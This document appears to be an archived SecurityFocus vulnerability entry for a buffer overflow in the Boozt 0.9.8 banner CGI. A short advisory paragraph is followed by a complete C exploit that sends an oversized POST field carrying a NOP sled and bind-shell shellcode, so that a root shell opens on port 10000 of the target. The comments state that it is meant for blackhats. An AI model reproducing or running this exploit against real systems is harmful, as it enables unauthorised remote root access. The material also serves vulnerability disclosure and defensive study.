source: http://www.securityfocus.com/bid/6281/info

A vulnerability has been discovered in Boozt. By passing a malicious parameter of excessive length to the index.cgi script, it is possible to overrun a buffer. This could be exploited by a remote attacker to corrupt sensitive memory, which may result in the execution of arbitrary code.

This issue is known to affect Boozt 0.9.8 and it is not known whether other versions are affected.

/* -----------------------------------------------------------------------

   BOOZT! Not so Standard 0.9.8 CGI vulnerability exploit
   fixed/updated by BrainStorm - ElectronicSouls
   now its much more usefull ;>

   Original Code by: Rafael San Miguel Carrasco - rsanmcar@alum.uax.es

   script kiddie enabled! .. this will give you a rootshell on port 10000
   so this version isnt for admins its for blackhats! and kidz piss off!
   this isnt widely used so nothing for kiddies anyway, since they cant own
   100 systems with it =P ..

   greetz: ghQst,FreQ,it_fresh,SectorX,RobBbot,0x90,Resistor,Phantom,
           divineint,rocsteele,websk8ter,nutsax,BuRn-X and all other
           ElectronicSouls members - j00 r0ck =>

   -----------------------------------------------------------------------
*/


#include <netinet/in.h>

#define PORT 8080
#define BUFLEN 1597
#define RET 0xbffff297
#define NOP 0x90

int main (int argc, char **argv)
{
       int sockfd,
                i,
             cont;

        struct sockaddr_in dest;

        int html_len = 15;

        char cgicontent[2048];
        char buf[BUFLEN];
        char shellcode[]=  "\x31\xc0"                   // xor     eax, eax
                           "\x31\xdb"                   // xor     ebx, ebx
                           "\x89\xe5"                   // mov     ebp, esp
                           "\x99"                       // cdq
                           "\xb0\x66"                   // mov     al, 102
                           "\x89\x5d\xfc"               // mov     [ebp-4], ebx
                           "\x43"                       // inc     ebx
                           "\x89\x5d\xf8"               // mov     [ebp-8], ebx
                           "\x43"                       // inc     ebx
                           "\x89\x5d\xf4"               // mov     [ebp-12], ebx
                           "\x4b"                       // dec     ebx
                           "\x8d\x4d\xf4"               // lea     ecx, [ebp-12]
                           "\xcd\x80"                   // int     80h
                           "\x89\x45\xf4"               // mov     [ebp-12], eax
                           "\x43"                       // inc     ebx
                           "\x66\x89\x5d\xec"           // mov     [ebp-20], bx
                           "\x66\xc7\x45\xee\x27\x10"   // mov     [ebp-18], word 4135
                           "\x89\x55\xf0"               // mov     [ebp-16], edx
                           "\x8d\x45\xec"               // lea     eax, [ebp-20]
                           "\x89\x45\xf8"               // mov     [ebp-8], eax
                           "\xc6\x45\xfc\x10"           // mov     [ebp-4], byte 16
                           "\xb2\x66"                   // mov     dl, 102
                           "\x89\xd0"                   // mov     eax, ed
                           "\x8d\x4d\xf4"               // lea     ecx, [ebp-12]
                           "\xcd\x80"                   // int     80h
                           "\x89\xd0"                   // mov     eax, edx
                           "\xb3\x04"                   // mov     bl, 4
                           "\xcd\x80"                   // int     80h
                           "\x43"                       // inc     ebx
                           "\x89\xd0"                   // mov     eax, edx
                           "\x99"                       // cdq
                           "\x89\x55\xf8"               // mov     [ebp-8], edx
                           "\x89\x55\xfc"               // mov     [ebp-4], edx
                           "\xcd\x80"                   // int     80h
                           "\x31\xc9"                   // xor     ecx, ecx
                           "\x89\xc3"                   // mov     ebx, eax
                           "\xb1\x03"                   // mov     cl, 3
                           "\xb0\x3f"                   // mov     al, 63
                           "\x49"                       // dec     ecx
                           "\xcd\x80"                   // int     80h
                           "\x41"                       // inc     ecx
                           "\xe2\xf8"                   // loop    -7
                           "\x52"                       // push    edx
                           "\x68\x6e\x2f\x73\x68"       // push    dword 68732f6eh
                           "\x68\x2f\x2f\x62\x69"       // push    dword 69622f2fh
                           "\x89\xe3"                   // mov     ebx, esp
                           "\x52"                       // push    edx
                           "\x53"                       // push    ebx
                           "\x89\xe1"                   // mov     ecx, esp
                           "\xb0\x0b"                   // mov     al, 11
                           "\xcd\x80";                  // int     80h

        char *html[15] =
        {
                "POST /cgi-bin/boozt/admin/index.cgi HTTP/1.0\n",
                "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,*/*\n",
                "Referer: http://10.0.0.1:8080/cgi-bin/boozt/admin/index.cgi?section=5&input=1\n",
                "Accept-Language: en, de\n",
                "Content-Type: application/x-www-form-urlencoded\n",
                "UA-pixels: 640x480\n",
                "UA-color: color8\n",
                "UA-OS: Blackhat Leenux\n",
                "UA-CPU: x86\n",
                "User-Agent: Hackscape/1.0 (j00r asS gonna gets 0wned)\n",
                "Host: 10.0.0.1:8080\n",
                "Connection: Keep-Alive\n",
                "Content-Length: 1776\n",
                "Pragma: No-Cache\n",
                "\n",
        };

        if (argc < 2)
        {
                printf ("usage: %s <IP>\n", argv[0]);
                exit (-1);
        }

        printf ("\n-----------------------------------\n");
        printf ("   BOOZT! Not so Standard exploit    \n");
        printf (" (C) BrainStorm - ElectronicSouls    \n");
        printf ("-----------------------------------\n\n");
        for (i = 0; i < BUFLEN; i+=4)*( (long *) &buf[i]) = RET;
        for (i = 0; i < (BUFLEN - 16); i++) buf[i] = NOP;
        cont = 0;
        for (i = (BUFLEN - strlen (shellcode) - 16); i < (BUFLEN - 16); i++)
                  buf[i] = shellcode [cont++];
        strcpy (cgicontent, "name=");
        strncat (cgicontent, buf, sizeof (buf));
        strcat (cgicontent,"&target=&alt_text=&id_size=1&type=image&source=&source_path=Browse...&source_flash=&
source_flash_path=Browse...&script_name=&input=1&section=5&sent=1&submit=Create+New+Banner");

        printf ("* Connecting ...\n");
        if ( (sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
        {
         perror ("socket");
         exit (-1);
        }
        bzero (&dest, sizeof (dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons (PORT);
        dest.sin_addr.s_addr = inet_addr (argv[1]);
        if (connect (sockfd, &dest, sizeof (dest)) < 0)
        {
         perror ("connect");
         exit (-1);
        }
        printf ("* Connected. sending data ...\n");
        for (i = 0; i < html_len; i++)
        {
         if (write (sockfd, html[i], strlen(html[i])) < strlen(html[i]))
        {
         perror ("write");
         exit (-1);
        }
        }
        if (write (sockfd, cgicontent, strlen(cgicontent)) < strlen(cgicontent))
        {
         perror ("write cgicontent");
         exit (-1);
        }
        if (close (sockfd) < 0)
        {
         perror ("close");
         exit (-1);
        }
        printf("now connect to port 10000 on the victim host..          \n");
        printf("if everything went well you should get a rootshell :> \n\n");
        printf("enjoy..\n");
        return 0;
}